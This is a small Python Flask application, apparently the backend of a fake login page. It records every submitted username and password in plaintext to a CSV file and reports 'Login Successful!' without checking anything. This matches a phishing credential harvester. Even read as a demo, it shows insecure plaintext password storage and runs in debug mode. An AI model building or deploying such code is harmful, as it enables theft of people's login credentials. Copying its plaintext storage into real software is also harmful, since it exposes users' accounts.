from flask import Flask, render_template, request, redirect, url_for
import csv
import os

app = Flask(__name__)

# Ensure CSV file exists
CSV_FILE = "logins.csv"
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Username", "Password"])  # Headers


@app.route("/")
def login_page():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Store in CSV
    with open(CSV_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([username, password])

    return redirect(url_for("success"))  # Redirect to success page


@app.route("/success")
def success():
    return "<h1>Login Successful!</h1>"

if __name__ == "__main__":
    app.run(debug=True)
